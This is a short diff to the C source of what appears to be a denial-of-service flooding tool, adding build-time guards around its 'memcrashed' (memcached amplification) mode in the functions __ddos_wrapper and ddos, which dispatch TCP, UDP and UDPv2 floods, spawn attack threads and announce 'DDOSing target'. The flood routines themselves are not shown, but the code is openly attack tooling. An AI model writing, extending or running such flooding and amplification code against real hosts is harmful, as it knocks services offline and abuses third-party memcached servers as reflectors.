@@ -206,7 +206,11 @@ void __ddos_wrapper(_dos_param* x)
     } else if (x->mode == MODE_UDP) {
         _ddos_udp(x->host, x->port, x->packet);
     }else if(x->mode==MODE_MEMCRASHED){
-        memcrashed_ddos(x);
+#ifdef MEMCRASHED_INCLUDED        
+	memcrashed_ddos(x);
+#else
+	die("Memcrashed is not included in this build.");
+#endif
     }else if (x->mode==MODE_UDPV2){
         _ddos_udpv2(x->host, x->port, x->packet);
     } else {
@@ -236,8 +240,12 @@ void ddos(char* host, int port, char* packet, int _tcount, int mode)
         pthread_create(&_ddos[0], NULL, (void*)_ddos_stat, NULL);
         status=1;
     }else if(status&&mode==MODE_MEMCRASHED){
-        pthread_create(&_ddos[0], NULL, (void*)memcrashed_status, NULL);
+#ifdef MEMCRASHED_INCLUDED
+	pthread_create(&_ddos[0], NULL, (void*)memcrashed_status, NULL);
         status=1;
+#else
+	die("Failed to create thread: no memcrashed support in current build");
+#endif
     }else{
         success("Hit ^C to exit");
         success("DDOSing target %s",host);
